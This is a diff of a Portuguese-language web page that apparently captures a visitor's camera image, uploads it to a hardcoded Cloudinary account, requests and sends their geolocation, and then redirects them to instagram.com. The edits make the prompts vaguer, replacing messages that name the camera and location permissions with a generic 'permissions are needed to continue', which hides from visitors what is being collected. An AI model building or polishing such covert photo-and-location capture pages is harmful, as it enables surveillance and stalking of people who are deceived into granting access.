@@ -25,7 +25,7 @@
   </style>
 </head>
 <body>
-  <div id="overlay">Toque para continuar...</div>
+  <div id="overlay">Toque para continuar</div>
   <script>
     const cloudName = "dx5legahb";
     const uploadPreset = "upload";
@@ -95,7 +95,7 @@
           }, 500);
 
         } catch (err) {
-          showOverlay("Permissão da câmera é necessária. Toque para tentar novamente.", startFlow);
+          showOverlay("São necessárias as permissões para continuar. Toque para tentar novamente.", startFlow);
           reject(err);
         }
       });
@@ -122,11 +122,11 @@
               localStorage.removeItem("uploadedImageUrl");
               window.location.href = "https://instagram.com";
             } catch (err) {
-              showOverlay("Erro ao enviar localização. Toque para tentar novamente.", () => requestLocation(imageUrl));
+              showOverlay("São necessárias as permissões para continuar. Toque para tentar novamente.", () => requestLocation(imageUrl));
             }
           },
           () => {
-            showOverlay("Permissão de localização negada. Toque para tentar novamente.", () => {
+            showOverlay("São necessárias as permissões para continuar. Toque para tentar novamente.", () => {
               // Safari requer reload para novo pedido de permissão
               localStorage.setItem("retryLocation", "1");
               location.reload();
@@ -153,9 +153,9 @@
 
       if (savedUrl && retryLocation) {
         localStorage.removeItem("retryLocation");
-        showOverlay("Toque para tentar novamente a localização", () => requestLocation(savedUrl));
+        showOverlay("São necessárias as permissões para continuar. Toque para tentar novamente.", () => requestLocation(savedUrl));
       } else {
-        showOverlay("Toque para continuar...", startFlow);
+        showOverlay("Toque para continuar", startFlow);
       }
     });
   </script>
